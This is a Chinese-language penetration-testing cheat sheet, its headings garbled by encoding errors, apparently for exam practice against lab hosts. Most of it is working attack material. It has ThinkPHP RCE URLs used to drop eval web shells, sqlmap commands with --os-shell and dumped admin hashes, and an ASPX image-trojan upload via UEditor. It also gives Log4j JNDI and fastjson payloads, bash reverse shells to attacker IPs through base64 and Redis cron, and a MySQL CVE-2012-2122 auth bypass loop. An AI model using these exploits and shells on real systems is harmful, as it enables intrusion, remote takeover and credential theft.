å†…ç½‘æ¸—é€
å…¥ä¾µæ’æŸ¥


# è€ƒæ ¸

å•é¶æœºæ¸—é€
å†…ç½‘æ¸—é€
å®‰å…¨äº‹ä»¶å¤„ç½®

# å¤–ç½‘æ‰“ç‚¹

## èƒŒæ™¯ï¼ˆæ‹¿åˆ°webæœåŠ¡å™¨å…¥å£ç‚¹ï¼‰

### ä¿¡æ¯æ”¶é›†

#### 1ã€æŒ‡çº¹ä¿¡æ¯æ”¶é›†

ä¼ ç»Ÿæ¼æ´æ”¶é›†ï¼Œsqlæ³¨å…¥ï¼Œå¼±å£ä»¤çˆ†ç ´ï¼Œæ–‡ä»¶ä¸Šä¼ 

å·¥å…·ï¼š

- TideFinger

- Xray

- fscanæ‰«æ

- afrog

#### redis å†™å…¥å…¬é’¥

```
./fscan -h 172.16.166.142 -p 6379 -rf /tmp/id_ed25519.pub
```



#### 2ã€æ•æ„Ÿç›®å½•ï¼Œæ•æ„Ÿæ–‡ä»¶æ”¶é›†

è·å–å†å²æ¼æ´ï¼Œç„¶åæ¼æ´å¤ç°



#### ä¾‹ä¸€

```
fscan.exe -h 10.3.4.123


   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
10.3.4.123:80 open
[*] alive ports len is: 1
start vulscan
[*] WebTitle http://10.3.4.123         code:200 len:931    title:None
[+] PocScan http://10.3.4.123 poc-yaml-thinkphp5-controller-rce
å·²å®Œæˆ 1/1
[*] æ‰«æç»“æŸ,è€—æ—¶: 34.195984s


afrog.exe -t http://10.3.4.123/


|       A F ğŸ¸ O G      |       3.0.5/0.3.55    |       Bring color to life

[INF] Ceyeio is not configured
[ERR] Using OOB Server: ceyeio is not vaild
001 05-16 09:29:49 thinkphp5-controller-rce CRITICAL http://10.3.4.123/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91
002 05-16 09:29:50 thinkphp-5022-5129-rce CRITICAL http://10.3.4.123/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
[==================================================>] 100% (1414/1414), 1m6s
```

é€šè¿‡æ‰«æç»“æœæ‰¾åˆ°EXPå’ŒPOC

ä»¥afrogçš„ç»“æœä¸ºä¾‹

```
http://10.3.4.123/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91
```

ä¸Šé¢ä»£ç é€šè¿‡`&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91`è¾“å‡ºäº†`a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91`
é€šè¿‡ä¿®æ”¹`&vars[0]=printf`ä¸`vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91`å³å¯å®ç°phpä»£ç æ‰§è¡Œ


å¦‚ä½•é€šè¿‡whoamiåˆ°å†™æœ¨é©¬

1ã€åˆ©ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿå‘½ä»¤ `echo`


ä»¥ä¸Šé¢çš„ä¸ºä¾‹ï¼Œæ‰§è¡Œ `echo '<?php eval($_POST[1])?>' > xxx.php` å³å¯å†™å…¥shell

æ„é€ æˆurlä¸º


```
http://10.3.4.123/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php eval($_POST[1])?>' > xxx.php
```


2ã€åˆ©ç”¨phpæ–‡ä»¶å†™å…¥å‡½æ•°

```
fputsã€fwriteã€fopen
```

#### ä¾‹äºŒ

1ã€ç®€å•SQLæ³¨å…¥ï¼ˆæ— ç»•è¿‡ï¼‰ç›´æ¥ç”¨sqlmapå‡å°‘æ“ä½œ

```
python sqlmap.py -u http://10.3.4.131/vlist.php?cid=1 --batch
```

2ã€å¦‚æœå­˜åœ¨sqlæ³¨å…¥ï¼Œä¸€æ˜¯å¯ä»¥å°è¯•è·å–æ•°æ®åº“å¯†ç ï¼Œè€Œæ˜¯å°è¯•ä½¿ç”¨`--os-shell`è¿›è¡Œæ–‡ä»¶å†™å…¥

```
python3 sqlmap.py -u http://10.3.4.127/vlist.php?cid=1 --os-shell
```

sqlmapå¸¸ç”¨å‘½ä»¤

```
// æŸ¥çœ‹æ•°æ®åº“åˆ—è¡¨
python sqlmap.py -u http://10.3.4.127/vlist.php?cid=1 --dbs

[10:12:55] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] kkcms

// æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“
python sqlmap.py -u http://10.3.4.127/vlist.php?cid=1 -D kkcms --tables

+----------------------+
| xtcms_ad             |
| xtcms_adclass        |
| xtcms_book           |
| xtcms_fav            |
| xtcms_link           |
| xtcms_manager        |
| xtcms_nav            |
| xtcms_play           |
| xtcms_player         |
| xtcms_slideshow      |
| xtcms_system         |
| xtcms_user           |
| xtcms_user_card      |
| xtcms_user_cardclass |
| xtcms_user_group     |
| xtcms_user_pay       |
| xtcms_user_visit     |
| xtcms_userka         |
| xtcms_vod            |
| xtcms_vod_class      |
| xtcms_youlian        |
+----------------------+

// æŸ¥çœ‹è¡¨å†…å®¹
python sqlmap.py -u http://10.3.4.127/vlist.php?cid=1 -D kkcms -T xtcms_manager --dump


+------+--------+-------------------+----------------------------------+----------+------------+------------+----------------------------------+-------------+
| m_id | m_name | m_levels          | m_random                         | m_status | m_loginip  | m_loginnum | m_password                       | m_logintime |
+------+--------+-------------------+----------------------------------+----------+------------+------------+----------------------------------+-------------+
| 1    | admin  | b,c,d,e,f,g,h,i,j | 897de67740645ef418d8915547298d4c | 1        | 2130706433 | 0          | e10adc3949ba59abbe56e057f20f883e | 1503380295  |
+------+--------+-------------------+----------------------------------+----------+------------+------------+----------------------------------+-------------+
```


*é‡ç‚¹å…³æ³¨å­˜æœ‰åå°å¯†ç çš„è¡¨*


MySQLä½ç‰ˆæœ¬ä¸‹ï¼Œé»˜è®¤åŠ å¯†æ–¹å¼å¸‚MD5ï¼Œå¯ä»¥é€šè¿‡md5æ’åº“è·å–åŸæ–‡
ç¦»çº¿ç‰ˆæœ¬ä¸‹å¯ä»¥å°è¯• `hashcat` kaliè‡ªå¸¦,éœ€è¦è‡ªå·±æ”¶é›†å­—å…¸

é€šè¿‡ç›®å½•çˆ†ç ´æˆ–è€…ç›´æ¥çŒœè§£çš„æ–¹å¼ç™»å½•cmsåå°

#### ä¾‹ä¸‰

UEditor æ–‡ä»¶ä¸Šä¼ æ¼æ´

æµ‹è¯•æ¼æ´

```
http://10.3.4.131/UEditor/net/controller.ashx?action=catchimage
```


å›¾ç‰‡é©¬åˆ¶ä½œï¼Œå›¾ç‰‡å°½é‡é€‰æ‹©æ¯”è¾ƒå°çš„ï¼Œå¤§çš„å›¾ç‰‡å®¹æ˜“è¢«äºŒæ¬¡æ¸²æŸ“å¯¼è‡´æœ¨é©¬å¤±æ•ˆ

ç”Ÿæˆä¸€ä¸ªaspçš„æœ¨é©¬æ–‡ä»¶

```aspx
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
```

ç„¶åæ‰§è¡Œ

```
copy book.png/b + 3.aspx shell.png
```

å³å¯ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡é©¬

æœ€åæ„é€ æ•°æ®åŒ…

```
POST /UEditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: 10.3.4.131
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="100", "Chromium";v="100", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
 
source[]=http://192.168.198.227:8081/shell.png?.aspx
```


å“åº”ç»“æœ

```
HTTP/1.1 200 OK
 Cache-Control: private
 Content-Type: text/plain; charset=utf-8
 Server: Microsoft-IIS/7.5
 X-AspNet-Version: 4.0.30319
 X-Powered-By: ASP.NET
 Date: Thu, 16 May 2024 03:15:27 GMT
 Connection: close
 Content-Length: 164
 
 {"state":"SUCCESS","list":[{"state":"SUCCESS","source":"http://192.168.198.227:8081/shell.png?.aspx","url":"upload/image/20240516/6385145492687612506090648.aspx"}]}
```


#### ä¾‹å››ï¼šlog4j javaåå¼¹shell


shellæ ¼å¼

```
bash -c {echo,æ‰§è¡Œå‘½ä»¤çš„base64ç¼–ç ç»“æœ}|{base64,-d}|{bash,-i}
```

ä¾‹å¦‚è¦æ‰§è¡Œçš„å‘½ä»¤

```
bash -i >& /dev/tcp/192.168.198.227/4444 0>&1
```

base64ç¼–ç å

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OC4yMjcvNDQ0NCAwPiYx
```

åˆ™éœ€è¦æ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OC4yMjcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
```

ä½¿ç”¨JNDIæœåŠ¡å™¨

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 192.168.198.227 -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OC4yMjcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"
```

ä½¿ç”¨JNDIæœåŠ¡å™¨ç”Ÿæˆçš„æ”»å‡»åœ°å€ï¼Œæ„å»ºè‡ªå·±çš„EXP

```
${jndi:ldap://192.168.198.227:1389/pwzze5}
```

å¼€å¯ncç›‘å¬ï¼Œæ–¹ä¾¿è·å–åå¼¹shell

```
nc -lvnp 4444
```

æ‰§è¡ŒEXP


#### fastjson 1.2.47 RCE

å¤§éƒ¨åˆ†æ“ä½œå¦‚ä¸Š


è®¿é—®fastjsoné¡µé¢Burpå‘åŒ…ï¼Œæ”¹ä¸ºPOSTè¯·æ±‚ï¼Œä½¿ç”¨EXPï¼š

```json
{ "name":{ "@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl" }, "x":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://192.168.198.141:1389/80dbpb", "autoCommit":true } }
```

![fastjson1.2.47RCE](/img/01/01_fastjson1.2.47RCE.png)


#### ä¾‹äº”ï¼šBEESCMS


https://xz.aliyun.com/t/11955?time__1311=mqmx0DBG0QD%3Di%3DGkDlOIG7%2By5Sxjo%2BBO2ArD&alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-3




#### ä¾‹é¢˜å…­ï¼š seacms 7.2ï¼ˆæµ·æ´‹å½±è§†ç³»ç»Ÿï¼‰

https://blog.csdn.net/YouthBelief/article/details/121036440

åœ¨ `/system/admin_ip.php` ä¸‹ï¼Œé€šè¿‡å†™å…¥ä¸€ä¸‹å†…å®¹æ¼æ´å­˜åœ¨ç‚¹ipå‚æ•°

POCå¦‚ä¸‹

```
";phpinfo();
```

è®¿é—® http://10.3.4.104/data/admin/ip.php é¡µé¢æŸ¥çœ‹å‡ºç° `phpinfo()` å³ä¸ºæ³¨å…¥æˆåŠŸ

æœ€åå°†ä»¥ä¸ŠPOCä¿®æ”¹ä¸º

```
";eval($_POST["a"]);
```

å³å¯å†™å…¥ä¸€å¥è¯æœ¨é©¬

ç„¶åä½¿ç”¨èšå‰‘é“¾æ¥

è¿æ¥åœ°å€å¦‚ä¸‹

```
http://10.3.4.104/data/admin/ip.php
```


æœ€åIPæ–‡ä»¶å†…å®¹å¦‚ä¸‹

```
<?php $v = "0"; $ip = " ";eval($_POST["a"]);//";  ?>
```

# mysql æ¸—é€

## CVE-2012-2122

ä½¿ç”¨ bashexp è„šæœ¬

```bash
for i in `seq 1 1000`; do mysql -uroot -pwrong -h 10.3.4.77 -p3306 ; done
```

æŸ¥çœ‹MySQLçš„userè¡¨ï¼Œè·å–å¯†ç MD5ï¼Œåˆ°MD5è§£å¯†ç«™è§£å¯†å¯†ç ä¸º123456

é€šè¿‡ä¸‹é¢è¿™è¡Œä»£ç å†™shell

```sql
select "<?php phpinfo();?>" into outfile "/var/www/html/1.php"
```

# redis åå¼¹ shell

```bash
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.11.109/1234 0>&1\n"
```
